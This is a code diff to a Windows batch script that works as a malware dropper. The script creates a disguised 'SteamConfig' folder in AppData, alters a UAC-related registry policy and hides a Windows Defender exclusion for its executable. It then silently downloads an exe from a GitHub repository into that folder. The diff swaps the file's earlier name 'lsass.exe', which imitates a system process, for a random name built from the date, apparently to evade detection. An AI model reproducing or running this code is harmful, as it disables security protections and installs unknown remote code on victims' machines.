@@ -1,8 +1,12 @@
 @echo off
 setlocal enabledelayedexpansion
 
+:: Create a random file name using date and time
+for /f "tokens=2 delims==" %%I in ('"wmic os get localdatetime /value"') do set datetime=%%I
+set randomExeName=%datetime:~8,4%%datetime:~4,2%%datetime:~6,2%%datetime:~2,2%%datetime:~0,2%.exe
+
 set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
-set "exePath=%folderPath%\lsass.exe"
+set "exePath=%folderPath%\%randomExeName%"
 
 :: Create folder if not exists
 if not exist "%folderPath%" mkdir "%folderPath%"
@@ -13,7 +17,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Enab
 :: Use PowerShell to add exclusion for the executable (without opening PowerShell window)
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess '%exePath%'" >nul 2>&1
 
-:: Download the executable file silently
+:: Download the executable file silently with random name
 curl -L -o "%exePath%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" >nul 2>&1
 if %errorlevel% neq 0 exit /b 1
 
